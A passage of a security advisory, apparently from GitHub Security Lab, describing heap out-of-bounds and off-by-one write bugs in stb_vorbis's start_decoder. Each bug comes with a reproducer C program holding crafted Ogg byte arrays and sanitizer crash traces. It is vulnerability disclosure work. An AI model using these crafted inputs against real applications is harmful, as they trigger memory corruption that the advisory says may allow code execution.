    <span class="n">alloc</span><span class="p">.</span><span class="n">alloc_buffer</span> <span class="o">=</span> <span class="p">(</span><span class="kt">char</span><span class="o">*</span><span class="p">)</span><span class="n">malloc</span><span class="p">(</span><span class="n">alloc_buffer_length</span><span class="p">);</span>
    <span class="n">alloc</span><span class="p">.</span><span class="n">alloc_buffer_length_in_bytes</span> <span class="o">=</span> <span class="n">alloc_buffer_length</span><span class="p">;</span>
    <span class="kt">int</span> <span class="n">err</span><span class="p">;</span>
    <span class="n">stb_vorbis</span><span class="o">*</span> <span class="n">out</span> <span class="o">=</span> <span class="n">stb_vorbis_open_memory</span><span class="p">(</span><span class="n">data</span><span class="p">,</span> <span class="n">size</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">err</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">alloc</span><span class="p">);</span>
    <span class="n">stb_vorbis_close</span><span class="p">(</span><span class="n">out</span><span class="p">);</span>
    <span class="n">free</span><span class="p">(</span><span class="n">alloc</span><span class="p">.</span><span class="n">alloc_buffer</span><span class="p">);</span>
    <span class="k">return</span> <span class="mi">0</span><span class="p">;</span>
<span class="p">}</span>
</code></pre></div></div>

<ol>
  <li>Run the program to hit the error.</li>
</ol>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>==95610==ERROR: AddressSanitizer: heap-buffer-overflow on address 0x7f0f5eaff800 at pc 0x0000004e4133 bp 0x7fff88645e30 sp 0x7fff88645e28
WRITE of size 1 at 0x7f0f5eaff800 thread T0
    #0 0x4e4132 in start_decoder(stb_vorbis*) tests/../stb_vorbis.c:3656:20
    #1 0x4f9444 in stb_vorbis_open_memory tests/../stb_vorbis.c:5112:8
</code></pre></div></div>

<h3 id="issue-10-heap-buffer-out-of-bounds-write-in-start_decoder-ghsl-2023-167">Issue 10: Heap buffer out of bounds write in <code class="language-plaintext highlighter-rouge">start_decoder</code> (<code class="language-plaintext highlighter-rouge">GHSL-2023-167</code>)</h3>

<p>A crafted file may trigger out of bounds write in <a href="https://github.com/nothings/stb/blob/5736b15f7ea0ffb08dd38af21067c314d6a3aae9/stb_vorbis.c#L3658"><code class="language-plaintext highlighter-rouge">f-&gt;vendor[len] = (char)'\0';</code></a> [1]. The root cause is that if <a href="https://github.com/nothings/stb/blob/5736b15f7ea0ffb08dd38af21067c314d6a3aae9/stb_vorbis.c#L3652-L3658"><code class="language-plaintext highlighter-rouge">len</code> read in <code class="language-plaintext highlighter-rouge">start_decoder</code></a> [2] is a negative number and <a href="https://github.com/nothings/stb/blob/5736b15f7ea0ffb08dd38af21067c314d6a3aae9/stb_vorbis.c#L950-L961"><code class="language-plaintext highlighter-rouge">setup_malloc</code></a> [3] successfully allocates memory in that case [4], but memory write is done with a negative index <code class="language-plaintext highlighter-rouge">len</code> [1].</p>

<div class="language-cpp highlighter-rouge"><div class="highlight"><pre class="highlight"><code>   <span class="n">len</span> <span class="o">=</span> <span class="n">get32_packet</span><span class="p">(</span><span class="n">f</span><span class="p">);</span> <span class="c1">// [2]</span>
   <span class="n">f</span><span class="o">-&gt;</span><span class="n">vendor</span> <span class="o">=</span> <span class="p">(</span><span class="kt">char</span><span class="o">*</span><span class="p">)</span><span class="n">setup_malloc</span><span class="p">(</span><span class="n">f</span><span class="p">,</span> <span class="k">sizeof</span><span class="p">(</span><span class="kt">char</span><span class="p">)</span> <span class="o">*</span> <span class="p">(</span><span class="n">len</span><span class="o">+</span><span class="mi">1</span><span class="p">));</span> <span class="c1">// [3]</span>
   <span class="k">if</span> <span class="p">(</span><span class="n">f</span><span class="o">-&gt;</span><span class="n">vendor</span> <span class="o">==</span> <span class="nb">NULL</span><span class="p">)</span>                           <span class="k">return</span> <span class="nf">error</span><span class="p">(</span><span class="n">f</span><span class="p">,</span> <span class="n">VORBIS_outofmem</span><span class="p">);</span>
   <span class="k">for</span><span class="p">(</span><span class="n">i</span><span class="o">=</span><span class="mi">0</span><span class="p">;</span> <span class="n">i</span> <span class="o">&lt;</span> <span class="n">len</span><span class="p">;</span> <span class="o">++</span><span class="n">i</span><span class="p">)</span> <span class="p">{</span>
      <span class="n">f</span><span class="o">-&gt;</span><span class="n">vendor</span><span class="p">[</span><span class="n">i</span><span class="p">]</span> <span class="o">=</span> <span class="n">get8_packet</span><span class="p">(</span><span class="n">f</span><span class="p">);</span>
   <span class="p">}</span>
   <span class="n">f</span><span class="o">-&gt;</span><span class="n">vendor</span><span class="p">[</span><span class="n">len</span><span class="p">]</span> <span class="o">=</span> <span class="p">(</span><span class="kt">char</span><span class="p">)</span><span class="sc">'\0'</span><span class="p">;</span> <span class="c1">// [1]</span>

<span class="p">...</span>

<span class="k">static</span> <span class="kt">void</span> <span class="o">*</span><span class="nf">setup_malloc</span><span class="p">(</span><span class="n">vorb</span> <span class="o">*</span><span class="n">f</span><span class="p">,</span> <span class="kt">int</span> <span class="n">sz</span><span class="p">)</span>
<span class="p">{</span>
   <span class="n">sz</span> <span class="o">=</span> <span class="p">(</span><span class="n">sz</span><span class="o">+</span><span class="mi">7</span><span class="p">)</span> <span class="o">&amp;</span> <span class="o">~</span><span class="mi">7</span><span class="p">;</span> <span class="c1">// round up to nearest 8 for alignment of future allocs.</span>
   <span class="n">f</span><span class="o">-&gt;</span><span class="n">setup_memory_required</span> <span class="o">+=</span> <span class="n">sz</span><span class="p">;</span>
   <span class="k">if</span> <span class="p">(</span><span class="n">f</span><span class="o">-&gt;</span><span class="n">alloc</span><span class="p">.</span><span class="n">alloc_buffer</span><span class="p">)</span> <span class="p">{</span>
      <span class="kt">void</span> <span class="o">*</span><span class="n">p</span> <span class="o">=</span> <span class="p">(</span><span class="kt">char</span> <span class="o">*</span><span class="p">)</span> <span class="n">f</span><span class="o">-&gt;</span><span class="n">alloc</span><span class="p">.</span><span class="n">alloc_buffer</span> <span class="o">+</span> <span class="n">f</span><span class="o">-&gt;</span><span class="n">setup_offset</span><span class="p">;</span> <span class="c1">// [4]</span>
      <span class="k">if</span> <span class="p">(</span><span class="n">f</span><span class="o">-&gt;</span><span class="n">setup_offset</span> <span class="o">+</span> <span class="n">sz</span> <span class="o">&gt;</span> <span class="n">f</span><span class="o">-&gt;</span><span class="n">temp_offset</span><span class="p">)</span> <span class="k">return</span> <span class="nb">NULL</span><span class="p">;</span>
      <span class="n">f</span><span class="o">-&gt;</span><span class="n">setup_offset</span> <span class="o">+=</span> <span class="n">sz</span><span class="p">;</span>
      <span class="k">return</span> <span class="n">p</span><span class="p">;</span>
   <span class="p">}</span>
   <span class="k">return</span> <span class="n">sz</span> <span class="o">?</span> <span class="n">malloc</span><span class="p">(</span><span class="n">sz</span><span class="p">)</span> <span class="o">:</span> <span class="nb">NULL</span><span class="p">;</span>
<span class="p">}</span>
</code></pre></div></div>

<p>Same vulnerability exists in <a href="https://github.com/nothings/stb/blob/5736b15f7ea0ffb08dd38af21067c314d6a3aae9/stb_vorbis.c#L969-L978"><code class="language-plaintext highlighter-rouge">setup_temp_malloc</code></a> at [5]</p>

<div class="language-cpp highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="k">static</span> <span class="kt">void</span> <span class="o">*</span><span class="nf">setup_temp_malloc</span><span class="p">(</span><span class="n">vorb</span> <span class="o">*</span><span class="n">f</span><span class="p">,</span> <span class="kt">int</span> <span class="n">sz</span><span class="p">)</span>
<span class="p">{</span>
   <span class="n">sz</span> <span class="o">=</span> <span class="p">(</span><span class="n">sz</span><span class="o">+</span><span class="mi">7</span><span class="p">)</span> <span class="o">&amp;</span> <span class="o">~</span><span class="mi">7</span><span class="p">;</span> <span class="c1">// round up to nearest 8 for alignment of future allocs.</span>
   <span class="k">if</span> <span class="p">(</span><span class="n">f</span><span class="o">-&gt;</span><span class="n">alloc</span><span class="p">.</span><span class="n">alloc_buffer</span><span class="p">)</span> <span class="p">{</span>
      <span class="k">if</span> <span class="p">(</span><span class="n">f</span><span class="o">-&gt;</span><span class="n">temp_offset</span> <span class="o">-</span> <span class="n">sz</span> <span class="o">&lt;</span> <span class="n">f</span><span class="o">-&gt;</span><span class="n">setup_offset</span><span class="p">)</span> <span class="k">return</span> <span class="nb">NULL</span><span class="p">;</span> <span class="c1">// [5]</span>
      <span class="n">f</span><span class="o">-&gt;</span><span class="n">temp_offset</span> <span class="o">-=</span> <span class="n">sz</span><span class="p">;</span>
      <span class="k">return</span> <span class="p">(</span><span class="kt">char</span> <span class="o">*</span><span class="p">)</span> <span class="n">f</span><span class="o">-&gt;</span><span class="n">alloc</span><span class="p">.</span><span class="n">alloc_buffer</span> <span class="o">+</span> <span class="n">f</span><span class="o">-&gt;</span><span class="n">temp_offset</span><span class="p">;</span>
   <span class="p">}</span>
   <span class="k">return</span> <span class="nf">malloc</span><span class="p">(</span><span class="n">sz</span><span class="p">);</span>
<span class="p">}</span>
</code></pre></div></div>

<p>Similarly if <code class="language-plaintext highlighter-rouge">len</code> is <code class="language-plaintext highlighter-rouge">INT_MAX</code> the integer overflow <code class="language-plaintext highlighter-rouge">len+1</code> happens in <a href="https://github.com/nothings/stb/blob/5736b15f7ea0ffb08dd38af21067c314d6a3aae9/stb_vorbis.c#L3653"><code class="language-plaintext highlighter-rouge">f-&gt;vendor = (char*)setup_malloc(f, sizeof(char) * (len+1));</code></a> [1] and <a href="https://github.com/nothings/stb/blob/5736b15f7ea0ffb08dd38af21067c314d6a3aae9/stb_vorbis.c#L3670C7-L3670C75"><code class="language-plaintext highlighter-rouge">f-&gt;comment_list[i] = (char*)setup_malloc(f, sizeof(char) * (len+1));</code></a> [6]. This case however allows writing multiple times past the end of the internal <code class="language-plaintext highlighter-rouge">f-&gt;alloc.alloc_buffer</code> buffer.</p>

<div class="language-cpp highlighter-rouge"><div class="highlight"><pre class="highlight"><code>   <span class="k">for</span><span class="p">(</span><span class="n">i</span><span class="o">=</span><span class="mi">0</span><span class="p">;</span> <span class="n">i</span> <span class="o">&lt;</span> <span class="n">f</span><span class="o">-&gt;</span><span class="n">comment_list_length</span><span class="p">;</span> <span class="o">++</span><span class="n">i</span><span class="p">)</span> <span class="p">{</span>
      <span class="n">len</span> <span class="o">=</span> <span class="n">get32_packet</span><span class="p">(</span><span class="n">f</span><span class="p">);</span>
      <span class="n">f</span><span class="o">-&gt;</span><span class="n">comment_list</span><span class="p">[</span><span class="n">i</span><span class="p">]</span> <span class="o">=</span> <span class="p">(</span><span class="kt">char</span><span class="o">*</span><span class="p">)</span><span class="n">setup_malloc</span><span class="p">(</span><span class="n">f</span><span class="p">,</span> <span class="k">sizeof</span><span class="p">(</span><span class="kt">char</span><span class="p">)</span> <span class="o">*</span> <span class="p">(</span><span class="n">len</span><span class="o">+</span><span class="mi">1</span><span class="p">));</span> <span class="c1">// [6]</span>
      <span class="k">if</span> <span class="p">(</span><span class="n">f</span><span class="o">-&gt;</span><span class="n">comment_list</span><span class="p">[</span><span class="n">i</span><span class="p">]</span> <span class="o">==</span> <span class="nb">NULL</span><span class="p">)</span>               <span class="k">return</span> <span class="n">error</span><span class="p">(</span><span class="n">f</span><span class="p">,</span> <span class="n">VORBIS_outofmem</span><span class="p">);</span>

      <span class="k">for</span><span class="p">(</span><span class="n">j</span><span class="o">=</span><span class="mi">0</span><span class="p">;</span> <span class="n">j</span> <span class="o">&lt;</span> <span class="n">len</span><span class="p">;</span> <span class="o">++</span><span class="n">j</span><span class="p">)</span> <span class="p">{</span>
         <span class="n">f</span><span class="o">-&gt;</span><span class="n">comment_list</span><span class="p">[</span><span class="n">i</span><span class="p">][</span><span class="n">j</span><span class="p">]</span> <span class="o">=</span> <span class="n">get8_packet</span><span class="p">(</span><span class="n">f</span><span class="p">);</span>
      <span class="p">}</span>
      <span class="n">f</span><span class="o">-&gt;</span><span class="n">comment_list</span><span class="p">[</span><span class="n">i</span><span class="p">][</span><span class="n">len</span><span class="p">]</span> <span class="o">=</span> <span class="p">(</span><span class="kt">char</span><span class="p">)</span><span class="sc">'\0'</span><span class="p">;</span>
   <span class="p">}</span>
</code></pre></div></div>

<h4 id="impact-9">Impact</h4>

<p>This issue may lead to code execution.</p>

<h4 id="resources-9">Resources</h4>

<p>To reproduce the issue:</p>

<ol>
  <li>Make ASAN build of the following program:</li>
</ol>

<div class="language-cpp highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="cp">#include</span> <span class="cpf">"../stb_vorbis.c"</span><span class="cp">
#include</span> <span class="cpf">&lt;stdint.h&gt;</span><span class="cp">
</span>
<span class="kt">int</span> <span class="nf">main</span><span class="p">(</span><span class="kt">int</span> <span class="n">argc</span><span class="p">,</span> <span class="kt">char</span><span class="o">*</span> <span class="n">argv</span><span class="p">[])</span>
<span class="p">{</span>
    <span class="k">const</span> <span class="kt">uint8_t</span> <span class="n">data</span><span class="p">[]</span> <span class="o">=</span> <span class="p">{</span><span class="mh">0x4f</span><span class="p">,</span><span class="mh">0x67</span><span class="p">,</span><span class="mh">0x67</span><span class="p">,</span><span class="mh">0x53</span><span class="p">,</span><span class="mh">0x00</span><span class="p">,</span><span class="mh">0x02</span><span class="p">,</span><span class="mh">0xac</span><span class="p">,</span><span class="mh">0xf4</span><span class="p">,</span><span class="mh">0x30</span><span class="p">,</span>
                            <span class="mh">0x19</span><span class="p">,</span><span class="mh">0x50</span><span class="p">,</span><span class="mh">0x13</span><span class="p">,</span><span class="mh">0x00</span><span class="p">,</span><span class="mh">0x68</span><span class="p">,</span><span class="mh">0x00</span><span class="p">,</span><span class="mh">0x00</span><span class="p">,</span><span class="mh">0x00</span><span class="p">,</span><span class="mh">0x21</span><span class="p">,</span>
                            <span class="mh">0x00</span><span class="p">,</span><span class="mh">0x40</span><span class="p">,</span><span class="mh">0x00</span><span class="p">,</span><span class="mh">0x00</span><span class="p">,</span><span class="mh">0x00</span><span class="p">,</span><span class="mh">0x7e</span><span class="p">,</span><span class="mh">0x84</span><span class="p">,</span><span class="mh">0x04</span><span class="p">,</span><span class="mh">0x01</span><span class="p">,</span>
                            <span class="mh">0x1e</span><span class="p">,</span><span class="mh">0x01</span><span class="p">,</span><span class="mh">0x76</span><span class="p">,</span><span class="mh">0x6f</span><span class="p">,</span><span class="mh">0x72</span><span class="p">,</span><span class="mh">0x62</span><span class="p">,</span><span class="mh">0x69</span><span class="p">,</span><span class="mh">0x73</span><span class="p">,</span><span class="mh">0x00</span><span class="p">,</span>
                            <span class="mh">0x00</span><span class="p">,</span><span class="mh">0x00</span><span class="p">,</span><span class="mh">0x00</span><span class="p">,</span><span class="mh">0x05</span><span class="p">,</span><span class="mh">0x00</span><span class="p">,</span><span class="mh">0x45</span><span class="p">,</span><span class="mh">0xc5</span><span class="p">,</span><span class="mh">0x87</span><span class="p">,</span><span class="mh">0x03</span><span class="p">,</span>
                            <span class="mh">0x00</span><span class="p">,</span><span class="mh">0x04</span><span class="p">,</span><span class="mh">0x00</span><span class="p">,</span><span class="mh">0x02</span><span class="p">,</span><span class="mh">0x00</span><span class="p">,</span><span class="mh">0x08</span><span class="p">,</span><span class="mh">0x00</span><span class="p">,</span><span class="mh">0x00</span><span class="p">,</span><span class="mh">0x01</span><span class="p">,</span>
                            <span class="mh">0x00</span><span class="p">,</span><span class="mh">0x2e</span><span class="p">,</span><span class="mh">0xa9</span><span class="p">,</span><span class="mh">0xcb</span><span class="p">,</span><span class="mh">0x4f</span><span class="p">,</span><span class="mh">0x67</span><span class="p">,</span><span class="mh">0x67</span><span class="p">,</span><span class="mh">0x53</span><span class="p">,</span><span class="mh">0x00</span><span class="p">,</span>
                            <span class="mh">0x28</span><span class="p">,</span><span class="mh">0x00</span><span class="p">,</span><span class="mh">0x00</span><span class="p">,</span><span class="mh">0xf7</span><span class="p">,</span><span class="mh">0xff</span><span class="p">,</span><span class="mh">0xff</span><span class="p">,</span><span class="mh">0x7f</span><span class="p">,</span><span class="mh">0x68</span><span class="p">,</span><span class="mh">0x00</span><span class="p">,</span>
                            <span class="mh">0xff</span><span class="p">,</span><span class="mh">0xff</span><span class="p">,</span><span class="mh">0xff</span><span class="p">,</span><span class="mh">0xff</span><span class="p">,</span><span class="mh">0xff</span><span class="p">,</span><span class="mh">0xff</span><span class="p">,</span><span class="mh">0xff</span><span class="p">,</span><span class="mh">0x76</span><span class="p">,</span><span class="mh">0x6f</span><span class="p">,</span>
                            <span class="mh">0x72</span><span class="p">,</span><span class="mh">0x73</span><span class="p">,</span><span class="mh">0x00</span><span class="p">,</span><span class="mh">0x00</span><span class="p">,</span><span class="mh">0x03</span><span class="p">,</span><span class="mh">0x76</span><span class="p">,</span><span class="mh">0x6f</span><span class="p">,</span><span class="mh">0x72</span><span class="p">,</span><span class="mh">0x62</span><span class="p">,</span>
                            <span class="mh">0x69</span><span class="p">,</span><span class="mh">0x73</span><span class="p">,</span><span class="mh">0xff</span><span class="p">,</span><span class="mh">0xff</span><span class="p">,</span><span class="mh">0xff</span><span class="p">,</span><span class="mh">0xee</span><span class="p">};</span>
    <span class="kt">size_t</span> <span class="n">size</span> <span class="o">=</span> <span class="k">sizeof</span><span class="p">(</span><span class="n">data</span><span class="p">);</span>

    <span class="n">stb_vorbis_alloc</span> <span class="n">alloc</span><span class="p">;</span>
    <span class="kt">int</span> <span class="n">alloc_buffer_length</span> <span class="o">=</span> <span class="mi">600</span> <span class="o">*</span> <span class="mi">1024</span><span class="p">;</span>
    <span class="n">alloc</span><span class="p">.</span><span class="n">alloc_buffer</span> <span class="o">=</span> <span class="p">(</span><span class="kt">char</span><span class="o">*</span><span class="p">)</span><span class="n">malloc</span><span class="p">(</span><span class="n">alloc_buffer_length</span><span class="p">);</span>
    <span class="n">alloc</span><span class="p">.</span><span class="n">alloc_buffer_length_in_bytes</span> <span class="o">=</span> <span class="n">alloc_buffer_length</span><span class="p">;</span>
    <span class="kt">int</span> <span class="n">err</span><span class="p">;</span>
    <span class="n">stb_vorbis</span><span class="o">*</span> <span class="n">out</span> <span class="o">=</span> <span class="n">stb_vorbis_open_memory</span><span class="p">(</span><span class="n">data</span><span class="p">,</span> <span class="n">size</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">err</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">alloc</span><span class="p">);</span>
    <span class="n">stb_vorbis_close</span><span class="p">(</span><span class="n">out</span><span class="p">);</span>
    <span class="n">free</span><span class="p">(</span><span class="n">alloc</span><span class="p">.</span><span class="n">alloc_buffer</span><span class="p">);</span>
    <span class="k">return</span> <span class="mi">0</span><span class="p">;</span>
<span class="p">}</span>
</code></pre></div></div>

<ol>
  <li>Run the program to hit the error.</li>
</ol>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>AddressSanitizer:DEADLYSIGNAL
=================================================================
==302322==ERROR: AddressSanitizer: SEGV on unknown address 0x7f70bd3697ff (pc 0x0000004e41f4 bp 0x7ffc029b3070 sp 0x7ffc029b0be0 T0)
==302322==The signal is caused by a WRITE memory access.
    #0 0x4e41f4 in start_decoder(stb_vorbis*) tests/../stb_vorbis.c:3658:19
    #1 0x4f9444 in stb_vorbis_open_memory tests/../stb_vorbis.c:5112:8
    #2 0x4fd8e9 in main tests/stb_vorbis_fuzzer.c:24:23
</code></pre></div></div>

<h3 id="issue-11-off-by-one-heap-buffer-write-in-start_decoder-ghsl-2023-168">Issue 11: Off-by-one heap buffer write in <code class="language-plaintext highlighter-rouge">start_decoder</code> (<code class="language-plaintext highlighter-rouge">GHSL-2023-168</code>)</h3>

<p>A crafted file may trigger out of buffer write in <a href="https://github.com/nothings/stb/blob/5736b15f7ea0ffb08dd38af21067c314d6a3aae9/stb_vorbis.c#L4105-L4111"><code class="language-plaintext highlighter-rouge">start_decoder</code></a> at [1] and [2]</p>

<div class="language-cpp highlighter-rouge"><div class="highlight"><pre class="highlight"><code>      <span class="k">for</span> <span class="p">(</span><span class="n">j</span><span class="o">=</span><span class="mi">0</span><span class="p">;</span> <span class="n">j</span> <span class="o">&lt;</span> <span class="n">m</span><span class="o">-&gt;</span><span class="n">submaps</span><span class="p">;</span> <span class="o">++</span><span class="n">j</span><span class="p">)</span> <span class="p">{</span>
         <span class="n">get_bits</span><span class="p">(</span><span class="n">f</span><span class="p">,</span><span class="mi">8</span><span class="p">);</span> <span class="c1">// discard</span>
         <span class="n">m</span><span class="o">-&gt;</span><span class="n">submap_floor</span><span class="p">[</span><span class="n">j</span><span class="p">]</span> <span class="o">=</span> <span class="n">get_bits</span><span class="p">(</span><span class="n">f</span><span class="p">,</span><span class="mi">8</span><span class="p">);</span> <span class="c1">// [1] Off by one write</span>
         <span class="n">m</span><span class="o">-&gt;</span><span class="n">submap_residue</span><span class="p">[</span><span class="n">j</span><span class="p">]</span> <span class="o">=</span> <span class="n">get_bits</span><span class="p">(</span><span class="n">f</span><span class="p">,</span><span class="mi">8</span><span class="p">);</span> <span class="c1">// [2] Off by one write</span>
         <span class="k">if</span> <span class="p">(</span><span class="n">m</span><span class="o">-&gt;</span><span class="n">submap_floor</span><span class="p">[</span><span class="n">j</span><span class="p">]</span> <span class="o">&gt;=</span> <span class="n">f</span><span class="o">-&gt;</span><span class="n">floor_count</span><span class="p">)</span>      <span class="k">return</span> <span class="n">error</span><span class="p">(</span><span class="n">f</span><span class="p">,</span> <span class="n">VORBIS_invalid_setup</span><span class="p">);</span>
         <span class="k">if</span> <span class="p">(</span><span class="n">m</span><span class="o">-&gt;</span><span class="n">submap_residue</span><span class="p">[</span><span class="n">j</span><span class="p">]</span> <span class="o">&gt;=</span> <span class="n">f</span><span class="o">-&gt;</span><span class="n">residue_count</span><span class="p">)</span>  <span class="k">return</span> <span class="n">error</span><span class="p">(</span><span class="n">f</span><span class="p">,</span> <span class="n">VORBIS_invalid_setup</span><span class="p">);</span>
      <span class="p">}</span>
</code></pre></div></div>

<p>because at maximum <code class="language-plaintext highlighter-rouge">m-&gt;submaps</code> <a href="https://github.com/nothings/stb/blob/5736b15f7ea0ffb08dd38af21067c314d6a3aae9/stb_vorbis.c#L4074-L4079">can be 16</a> [3]</p>

<div class="language-cpp highlighter-rouge"><div class="highlight"><pre class="highlight"><code>      <span class="k">if</span> <span class="p">(</span><span class="n">get_bits</span><span class="p">(</span><span class="n">f</span><span class="p">,</span><span class="mi">1</span><span class="p">))</span>
         <span class="n">m</span><span class="o">-&gt;</span><span class="n">submaps</span> <span class="o">=</span> <span class="n">get_bits</span><span class="p">(</span><span class="n">f</span><span class="p">,</span><span class="mi">4</span><span class="p">)</span><span class="o">+</span><span class="mi">1</span><span class="p">;</span> <span class="c1">// [3]</span>
      <span class="k">else</span>
         <span class="n">m</span><span class="o">-&gt;</span><span class="n">submaps</span> <span class="o">=</span> <span class="mi">1</span><span class="p">;</span>
      <span class="k">if</span> <span class="p">(</span><span class="n">m</span><span class="o">-&gt;</span><span class="n">submaps</span> <span class="o">&gt;</span> <span class="n">max_submaps</span><span class="p">)</span>
         <span class="n">max_submaps</span> <span class="o">=</span> <span class="n">m</span><span class="o">-&gt;</span><span class="n">submaps</span><span class="p">;</span>
</code></pre></div></div>

<p>but <a href="https://github.com/nothings/stb/blob/5736b15f7ea0ffb08dd38af21067c314d6a3aae9/stb_vorbis.c#L753-L760"><code class="language-plaintext highlighter-rouge">submap_floor</code> and <code class="language-plaintext highlighter-rouge">submap_residue</code> are declared</a> as arrays of 15 elements at [4] and [5]</p>

<div class="language-cpp highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="k">typedef</span> <span class="k">struct</span>
<span class="p">{</span>
   <span class="n">uint16</span> <span class="n">coupling_steps</span><span class="p">;</span>
   <span class="n">MappingChannel</span> <span class="o">*</span><span class="n">chan</span><span class="p">;</span>
   <span class="n">uint8</span>  <span class="n">submaps</span><span class="p">;</span>
   <span class="n">uint8</span>  <span class="n">submap_floor</span><span class="p">[</span><span class="mi">15</span><span class="p">];</span> <span class="c1">// varies // [4]</span>
   <span class="n">uint8</span>  <span class="n">submap_residue</span><span class="p">[</span><span class="mi">15</span><span class="p">];</span> <span class="c1">// varies // [5]</span>
<span class="p">}</span> <span class="n">Mapping</span><span class="p">;</span>
</code></pre></div></div>

<h4 id="impact-10">Impact</h4>

<p>This issue may lead to code execution.</p>

<h4 id="resources-10">Resources</h4>

<p>To reproduce the issue:</p>

<ol>
  <li>Make UBSAN build of the following program:</li>
</ol>

<div class="language-cpp highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="cp">#include</span> <span class="cpf">"../stb_vorbis.c"</span><span class="cp">
#include</span> <span class="cpf">&lt;stdint.h&gt;</span><span class="cp">
</span>
<span class="kt">int</span> <span class="nf">main</span><span class="p">(</span><span class="kt">int</span> <span class="n">argc</span><span class="p">,</span> <span class="kt">char</span><span class="o">*</span> <span class="n">argv</span><span class="p">[])</span>
<span class="p">{</span>
    <span class="k">const</span> <span class="kt">uint8_t</span> <span class="n">data</span><span class="p">[]</span> <span class="o">=</span> <span class="p">{</span><span class="mh">0x4f</span><span class="p">,</span><span class="mh">0x67</span><span class="p">,</span><span class="mh">0x67</span><span class="p">,</span><span class="mh">0x53</span><span class="p">,</span><span class="mh">0x00</span><span class="p">,</span><span class="mh">0x02</span><span class="p">,</span><span class="mh">0x01</span><span class="p">,</span><span class="mh">0x5a</span><span class="p">,</span><span class="mh">0x81</span><span class="p">,</span>
                            <span class="mh">0x15</span><span class="p">,</span><span class="mh">0x9c</span><span class="p">,</span><span class="mh">0x00</span><span class="p">,</span><span class="mh">0x00</span><span class="p">,</span><span class="mh">0xbe</span><span class="p">,</span><span class="mh">0x21</span><span class="p">,</span><span class="mh">0x68</span><span class="p">,</span><span class="mh">0x00</span><span class="p">,</span><span class="mh">0x00</span><span class="p">,</span>
                            <span class="mh">0x00</span><span class="p">,</span><span class="mh">0x00</span><span class="p">,</span><span class="mh">0x00</span><span class="p">,</span><span class="mh">0x00</span><span class="p">,</span><span class="mh">0xa2</span><span class="p">,</span><span class="mh">0x64</span><span class="p">,</span><span class="mh">0x89</span><span class="p">,</span><span class="mh">0x6f</span><span class="p">,</span><span class="mh">0x01</span><span class="p">,</span>
                            <span class="mh">0x1e</span><span class="p">,</span><span class="mh">0x01</span><span class="p">,</span><span class="mh">0x76</span><span class="p">,</span><span class="mh">0x6f</span><span class="p">,</span><span class="mh">0x72</span><span class="p">,</span><span class="mh">0x62</span><span class="p">,</span><span class="mh">0x69</span><span class="p">,</span><span class="mh">0x73</span><span class="p">,</span><span class="mh">0x00</span><span class="p">,</span>
                            <span class="mh">0x00</span><span class="p">,</span><span class="mh">0x00</span><span class="p">,</span><span class="mh">0x00</span><span class="p">,</span><span class="mh">0x0e</span><span class="p">,</span><span class="mh">0x31</span><span class="p">,</span><span class="mh">0x1e</span><span class="p">,</span><span class="mh">0x01</span><span class="p">,</span><span class="mh">0x76</span><span class="p">,</span><span class="mh">0x6f</span><span class="p">,</span>
                            <span class="mh">0x72</span><span class="p">,</span><span class="mh">0xe3</span><span class="p">,</span><span class="mh">0x12</span><span class="p">,</span><span class="mh">0x02</span><span class="p">,</span><span class="mh">0x62</span><span class="p">,</span><span class="mh">0x69</span><span class="p">,</span><span class="mh">0x20</span><span class="p">,</span><span class="mh">0xd7</span><span class="p">,</span><span class="mh">0x73</span><span class="p">,</span>
                            <span class="mh">0x06</span><span class="p">,</span><span class="mh">0xd0</span><span class="p">,</span><span class="mh">0x97</span><span class="p">,</span><span class="mh">0x75</span><span class="p">,</span><span class="mh">0x4f</span><span class="p">,</span><span class="mh">0x67</span><span class="p">,</span><span class="mh">0x67</span><span class="p">,</span><span class="mh">0x53</span><span class="p">,</span><span class="mh">0x00</span><span class="p">,</span>
                            <span class="mh">0x9c</span><span class="p">,</span><span class="mh">0x00</span><span class="p">,</span><span class="mh">0xfc</span><span class="p">,</span><span class="mh">0x00</span><span class="p">,</span><span class="mh">0x4b</span><span class="p">,</span><span class="mh">0x02</span><span class="p">,</span><span class="mh">0x2d</span><span class="p">,</span><span class="mh">0x24</span><span class="p">,</span><span class="mh">0x00</span><span class="p">,</span>
                            <span class="mh">0x21</span><span class="p">,</span><span class="mh">0x68</span><span class="p">,</span><span class="mh">0x00</span><span class="p">,</span><span class="mh">0x00</span><span class="p">,</span><span class="mh">0x01</span><span class="p">,</span><span class="mh">0x00</span><span class="p">,</span><span class="mh">0x00</span><span class="p">,</span><span class="mh">0x00</span><span class="p">,</span><span class="mh">0xff</span><span class="p">,</span>
                            <span class="mh">0xff</span><span class="p">,</span><span class="mh">0xff</span><span class="p">,</span><span class="mh">0x05</span><span class="p">,</span><span class="mh">0x05</span><span class="p">,</span><span class="mh">0x16</span><span class="p">,</span><span class="mh">0x3e</span><span class="p">,</span><span class="mh">0x16</span><span class="p">,</span><span class="mh">0x01</span><span class="p">,</span><span class="mh">0x01</span><span class="p">,</span>
                            <span class="mh">0x03</span><span class="p">,</span><span class="mh">0x76</span><span class="p">,</span><span class="mh">0x6f</span><span class="p">,</span><span class="mh">0x72</span><span class="p">,</span><span class="mh">0x62</span><span class="p">,</span><span class="mh">0x69</span><span class="p">,</span><span class="mh">0x73</span><span class="p">,</span><span class="mh">0x00</span><span class="p">,</span><span class="mh">0x00</span><span class="p">,</span>
                            <span class="mh">0x00</span><span class="p">,</span><span class="mh">0x00</span><span class="p">,</span><span class="mh">0x00</span><span class="p">,</span><span class="mh">0x00</span><span class="p">,</span><span class="mh">0x00</span><span class="p">,</span><span class="mh">0x00</span><span class="p">,</span><span class="mh">0x27</span><span class="p">,</span><span class="mh">0x04</span><span class="p">,</span><span class="mh">0x00</span><span class="p">,</span>
